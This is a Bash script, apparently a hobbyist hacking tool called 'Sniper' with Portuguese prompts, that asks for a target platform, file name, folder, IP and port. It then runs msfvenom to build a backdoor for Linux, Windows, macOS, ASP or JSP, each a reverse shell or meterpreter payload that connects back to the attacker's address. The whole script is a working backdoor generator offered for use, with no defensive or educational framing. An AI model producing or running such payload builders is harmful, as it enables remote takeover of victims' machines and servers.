#!/bin/bash
#Coded By ./J0K3R00T
# 05/07/2018 | 09:13
#Chanel: https://www.youtube.com/channel/UCx0hnlmQGKL7gyQtQ0mI_lw
figlet -t Sniper
echo "#============================#"
echo "| [1] Linux                  |"
echo "| [2] Windows                |"
echo "| [3] Mac                    |"
echo "| [4] ASP (WEB)              |"
echo "| [5] JSP (WEB)              |"
echo "#============================#"
echo
echo -n "Numero da Backdoor: " && read escolha

	if [ $escolha == "1" ]
	 then
		   echo "Escolhida com Sucesso!!";

	elif [ $escolha == "2" ]
	 then
			echo "Escolhida com Sucesso!!";

	elif [ $escolha == "3" ]
	 then
			echo "Escolhida com Sucesso!!";

	elif [ $escolha == "4" ]
	 then
		    echo "Escolhida com Sucesso!!";

	elif [ $escolha == "5" ]
	 then
		    echo "Escolhida com Sucesso!!";

	elif [ $escolha != "1" ]
	 then
		    echo "Erro na Escolha !!!"; exit 0

	elif [ $escolha != "2" ]
	 then
	   		echo "Erro na Escolha !!!"; exit 0

	elif [ $escolha != "3" ]
	 then
			echo "Erro na Escolha !!!"; exit 0

	elif [ $escolha != "4" ]
	 then
		    echo "Erro na Escolha !!!"; exit 0

	elif [ $escolha != "5" ]
	 then
		    echo "Erro na Escolha !!!"; exit 0

		    
	fi
	
	echo -n "Digite o nome da Backdoor: " && read nome
	echo -n "Diretorio para Salvar: " && read diretorio
	echo -n "IP: " && read ip
	echo -n "Port: " && read port

if [ $escolha == 1 ]
	then
		echo "Criando Backdoor...."; msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $diretorio/$nome.elf
		payload="linux/x86/meterpreter/reverse_tcp"
	
		
elif [ $escolha == 2 ]
	then
		echo "Criando Backdoor...."; msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $diretorio/$nome.exe
		payload="windows/meterpreter/reverse_tcp"

elif [ $escolha == 3 ]
	then
		echo "Criando Backdoor...."; msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > $diretorio/$nome.macho
		payload="osx/x86/shell_reverse_tcp"

elif [ $escolha == 4 ]
	then
		echo "Criando Backdoor...."; msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $diretorio/$nome.asp
		payload="windows/meterpreter/reverse_tcp"

elif [ $escolha == 5 ] 
	then
		echo "Criando Backdoor...."; msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $diretorio/$nome.jsp
		payload="java/jsp_shell_reverse_tcp"
fi
		







	
	
